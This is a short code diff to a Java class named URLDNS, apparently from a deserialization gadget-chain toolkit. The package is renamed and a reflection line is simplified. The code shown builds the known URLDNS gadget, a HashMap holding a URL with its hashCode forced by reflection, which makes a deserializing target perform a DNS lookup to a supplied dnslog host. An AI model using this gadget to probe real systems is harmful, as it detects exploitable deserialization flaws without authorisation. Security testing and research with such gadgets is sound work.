@@ -1,4 +1,4 @@
-package com.chave.gadget;
+package com.chave.gadget.chain;
 
 import java.lang.reflect.Field;
 import java.net.MalformedURLException;
@@ -9,8 +9,7 @@ public class URLDNS {
     public static Object getObject(String dnslog) throws MalformedURLException, IllegalAccessException, NoSuchFieldException {
         URL url = new URL("http://" + dnslog);
         HashMap hashMap = new HashMap();
-        Class<URL> urlClass = URL.class;
-        Field hashCodeField = urlClass.getDeclaredField("hashCode");
+        Field hashCodeField = URL.class.getDeclaredField("hashCode");
         hashCodeField.setAccessible(true);
         hashCodeField.set(url, 1);
         hashMap.put(url, "1");
